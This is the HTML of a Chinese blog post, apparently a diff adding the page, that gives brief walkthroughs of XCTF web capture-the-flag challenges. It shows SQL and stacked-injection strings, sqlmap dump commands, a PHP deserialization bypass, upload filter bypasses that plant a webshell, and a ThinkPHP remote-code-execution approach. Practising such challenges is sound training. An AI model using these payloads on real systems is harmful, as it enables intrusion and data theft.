@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.11.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="php2发现缺失源代码，用扫码工具得出index.phps的后缀，得到代码段。分析代码段，发现id不能直接等于admin，而id需要等于admin，故要对其编码，而代码段会对输入的id进行urldecode解码，加上输入到url的一次自动解码，故要进行两次编码 unserialize3**__wakeup()**是PHP的一个魔法函数，在进行unserialize反序列化的时候，首先查看有无该函数">
+<meta property="og:type" content="article">
+<meta property="og:title" content="“刷题记录1“">
+<meta property="og:url" content="http://example.com/2023/08/19/%E2%80%9C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951%E2%80%9C/index.html">
+<meta property="og:site_name" content="临摹">
+<meta property="og:description" content="php2发现缺失源代码，用扫码工具得出index.phps的后缀，得到代码段。分析代码段，发现id不能直接等于admin，而id需要等于admin，故要对其编码，而代码段会对输入的id进行urldecode解码，加上输入到url的一次自动解码，故要进行两次编码 unserialize3**__wakeup()**是PHP的一个魔法函数，在进行unserialize反序列化的时候，首先查看有无该函数">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/image/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/1.png">
+<meta property="og:image" content="http://example.com/image/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/2.png">
+<meta property="og:image" content="http://example.com/image/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/3.png">
+<meta property="og:image" content="http://example.com/image/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/4.png">
+<meta property="og:image" content="http://example.com/image/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/5.png">
+<meta property="og:image" content="http://example.com/image/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/6.png">
+<meta property="article:published_time" content="2023-08-19T09:20:34.000Z">
+<meta property="article:modified_time" content="2023-08-19T10:30:57.270Z">
+<meta property="article:author" content="Justin">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/image/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/1.png">
+
+
+<link rel="canonical" href="http://example.com/2023/08/19/%E2%80%9C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951%E2%80%9C/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/08/19/%E2%80%9C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951%E2%80%9C/","path":"2023/08/19/“刷题记录1“/","title":"“刷题记录1“"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>“刷题记录1“ | 临摹</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">临摹</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#php2"><span class="nav-number">1.</span> <span class="nav-text">php2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#unserialize3"><span class="nav-number">2.</span> <span class="nav-text">unserialize3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#isc-06"><span class="nav-number">3.</span> <span class="nav-text">isc-06</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#baby-web"><span class="nav-number">4.</span> <span class="nav-text">baby_web</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#inget"><span class="nav-number">5.</span> <span class="nav-text">inget</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#easyuplaod"><span class="nav-number">6.</span> <span class="nav-text">easyuplaod</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#easyphp"><span class="nav-number">7.</span> <span class="nav-text">easyphp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NewsCenter"><span class="nav-number">8.</span> <span class="nav-text">NewsCenter</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#upload1"><span class="nav-number">9.</span> <span class="nav-text">upload1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web2"><span class="nav-number">10.</span> <span class="nav-text">web2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#php-rce"><span class="nav-number">11.</span> <span class="nav-text">php_rce</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#supersqli-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-number">12.</span> <span class="nav-text">supersqli(堆叠注入)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%9A"><span class="nav-number">12.1.</span> <span class="nav-text">查看数据库：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%EF%BC%9A"><span class="nav-number">12.2.</span> <span class="nav-text">查询：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#handler%E6%9F%A5%E8%AF%A2%E6%B3%95"><span class="nav-number">12.2.1.</span> <span class="nav-text">handler查询法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%84%E7%BC%96%E8%AF%91%E7%BB%95%E8%BF%87%E6%B3%95"><span class="nav-number">12.2.2.</span> <span class="nav-text">预编译绕过法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9%E5%8E%9F%E6%9F%A5%E8%AF%A2%E6%B3%95"><span class="nav-number">12.2.3.</span> <span class="nav-text">修改原查询法</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Justin</p>
+  <div class="site-description" itemprop="description">适得浮生</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">30</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/19/%E2%80%9C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951%E2%80%9C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Justin">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="临摹">
+      <meta itemprop="description" content="适得浮生">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="“刷题记录1“ | 临摹">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          “刷题记录1“
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-08-19 17:20:34 / 修改时间：18:30:57" itemprop="dateCreated datePublished" datetime="2023-08-19T17:20:34+08:00">2023-08-19</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" itemprop="url" rel="index"><span itemprop="name">攻防世界</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="php2"><a href="#php2" class="headerlink" title="php2"></a>php2</h1><p>发现缺失源代码，用扫码工具得出index.phps的后缀，得到代码段。分析代码段，发现id不能直接等于admin，而id需要等于admin，故要对其编码，而代码段会对输入的id进行urldecode解码，加上输入到url的一次自动解码，故要进行两次编码</p>
+<h1 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h1><p>**__wakeup()**是PHP的一个魔法函数，在进行unserialize反序列化的时候，首先查看有无该函数有的话就会先执行他<br>绕过：<br>可以通过增加对象的属性个数来进行绕过</p>
+<span id="more"></span>
+<p>对代码进行序列化得：O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;}<br>将对象属性由1变为2得到：O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}<br>url输入?code&#x3D;O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}即可</p>
+<h1 id="isc-06"><a href="#isc-06" class="headerlink" title="isc-06"></a>isc-06</h1><p>点进网站发现是个网页，发现只有一处可以进入，且发现选择时间没有反应，看到url栏id有变换，根据题目只有一处数据，故对id进行爆破即可</p>
+<h1 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h1><p>通过提示抓包，修改1.php为index.php,得到flag隐藏的信息,在hex中发现隐藏的flag</p>
+<h1 id="inget"><a href="#inget" class="headerlink" title="inget"></a>inget</h1><p>进行sql注入，最后结果为?id&#x3D;1’ or 1&#x3D;1–+(万能）<br>也可以通过sqlmap：<br>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://61.147.171.105:60332/?id=1">http://61.147.171.105:60332/?id=1</a> –dbs<br>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://61.147.171.105:60332/?id=1">http://61.147.171.105:60332/?id=1</a> -D cyber –tables<br>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://61.147.171.105:60332/?id=1">http://61.147.171.105:60332/?id=1</a> -D cyber -T cyber –columns<br>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://61.147.171.105:60332/?id=1">http://61.147.171.105:60332/?id=1</a> -D cyber -T cyber -C pw –dump</p>
+<h1 id="easyuplaod"><a href="#easyuplaod" class="headerlink" title="easyuplaod"></a>easyuplaod</h1><p>发现php，php3，phmtl都无法上传，于是运用.user.ini,上传.user.ini后抓包，修改如：<img src="/image/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/1.png" alt="打开方式"><br>再上传a.jpg，再用蚁键连接即可</p>
+<h1 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h1><p><img src="/image/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/2.png" alt="打开方式"><br>这里对提交的a需要满足a非空 且a的数值大于该6000000且a的长度不超过3<br>可用到科学计数法：科学计数法表示的1e7&#x2F;8&#x2F;9可以满足上述三个条件<br><img src="/image/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/3.png" alt="打开方式"><br>用php代码编写MD5碰撞脚本得到b&#x3D;53724<br><img src="/image/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/4.png" alt="打开方式"><br><img src="/image/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/5.png" alt="打开方式"><br>变量c也需要我们get上去，但是需要json格式。在确定了之后进行json编码即可<br>json格式即python中的字典格式<br>这里主要考察is_numeric函数的用法，is_numeric在php中判断参数是否是数值类型是否是数字或数字字符串。注意is_numeric(“a123”)返回false，is_numeric(“123a”)也返回false；单看这里还不能下结论。<br>再看后面，c的m键值后面还要做比较，因此不能直接简单构造一个is_numreric为false的字符串。例如，’123a’和一个整数作比较时，它会转换成123；’a123’和整数作比较时，由于第一个位置是a，非整数，php则规定其值为0，即变成了0和123比较（关于这个部分可以参考 php中字符串和整数比较 相关知识）。于是可以构造出一个c:{“m”:”12345a”}等等<br><img src="/image/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/6.png" alt="打开方式"><br>c还有个n键，其值是一个array类型，大小为2，并且第一个元素是一个数组类型<br>后面语句查找n键中是否有字符串’DGGJ’,如果找到指定的键值，则返回对应的键名，否则返回 FALSE。看到这里，?:运算符找不到的情况下直接die（退出），因此这里应该让它找到，故n键第二个值为’DGGJ’。<br>但是，后面foreach遍历时候有’DGGJ’反而直接die，看到这里，发现这两个是矛盾的。<br>而将一个字符串和一整数比较时会将字符串向整数，转化这个’DGGJ’一点整数的影子都找不到，因此只能判断为0，<br>（forEach() 方法用于调用数组的每个元素，并将元素传递给回调函数）<br>最后根据json编码格式对c进行编码即可<br>最终构造为a&#x3D;1e9&amp;b&#x3D;53724&amp;c&#x3D;{“m”:”12345a”,”n”:[[0,1,2],0]}</p>
+<h1 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h1><p>使用sqlmap即可</p>
+<h1 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h1><p>上传一句话木马图片，BP将png修改为php，上传后再用蚁键连接即可</p>
+<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>encode逆向算法为decode<br>substr() 函数返回字符串的一部分。substr(string,start,length)注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。<br>ord() 函数返回字符串中第一个字符的 ASCII 值。<br>chr() 函数从指定 ASCII 值返回字符。并可以指定ASCII是十进制或是十六进制或是八进制。<br>“.” 是字符运算符，作用是把两个字符串连接起来，其使用方法：首先创建一个PHP示例文件；然后定义两个变量；最后通过“$result.$result”方式将两个变量连接起来即可<br>str_rot13() 函数对字符串执行 ROT13 编码。ROT13 编码是把每一个字母在字母表中向前移动 13 个字母得到。数字和非字母字符保持不变。</p>
+<h1 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h1><p>进入后发现时是一个php框架，根据题目远程命令执行，我们在github上搜一下这个版本有什么漏洞，发现有好几个5.0，随便选择一个试一试，发现新提示5.0.2，得漏洞命令；<br>将命令中的id改成‘ls’，发现没什么可疑的，通过..&#x2F;查看上级目录，最终在根目录下查到flag文件，再用find语句：find &#x2F; -name “flag”寻找与flag相关的，得到名为’flag‘，再用cat语句即可得到flag</p>
+<h1 id="supersqli-堆叠注入"><a href="#supersqli-堆叠注入" class="headerlink" title="supersqli(堆叠注入)"></a>supersqli(堆叠注入)</h1><p>正常进行sql注入，发现联合注入时报错，页面显示select等关键词被禁用，于是尝试堆叠注入：</p>
+<h2 id="查看数据库："><a href="#查看数据库：" class="headerlink" title="查看数据库："></a>查看数据库：</h2><p>-1’; show databases; #<br>发现sqlmap查的数据库中没有的supersqli<br>查表：-1’;use supersqli;show tables;#<br>查字段：-1’;use supersqli;show columns from <code>1919810931114514</code>;#（当纯数字字符串是表名的时候需要加反引号&#96; ）<br>发现了flag的位置</p>
+<h2 id="查询："><a href="#查询：" class="headerlink" title="查询："></a>查询：</h2><h3 id="handler查询法"><a href="#handler查询法" class="headerlink" title="handler查询法"></a>handler查询法</h3><p>从语法上看，HANDLER可以通过指定的索引去访问数据：<br>-1’;use supersqli;handler <code>1919810931114514</code> open as p;handler p read first;#</p>
+<h3 id="预编译绕过法"><a href="#预编译绕过法" class="headerlink" title="预编译绕过法"></a>预编译绕过法</h3><p>-1’;<br>set @sql &#x3D; CONCAT(‘sele’,’ct flag from <code>1919810931114514</code>;’);<br>prepare stmt from @sql;<br>EXECUTE stmt;#<br>发现被strstr函数过滤，strstr函数是过滤函数，但不区分大小写，故利用大小写进行过滤</p>
+<h3 id="修改原查询法"><a href="#修改原查询法" class="headerlink" title="修改原查询法"></a>修改原查询法</h3><p>原理就是没有过滤掉alter，将字段flag改为1，在查询的时候直接出现flag<br>先看看我们一开始查询1的时候那表在哪，这里我们知道原查询默认的数据库就是supersqli，在表words的字段id<br>-1’;<br>alter tables words rename kkk;<br>alter tables 1919810931114514 rename words;<br>alter tables words change flag id varchar(100);#<br>然后在查询1’ or 1#</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/08/02/%E6%96%B0%E6%89%8B%E5%8C%BA/" rel="prev" title="新手区">
+                  <i class="fa fa-chevron-left"></i> 新手区
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Justin</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
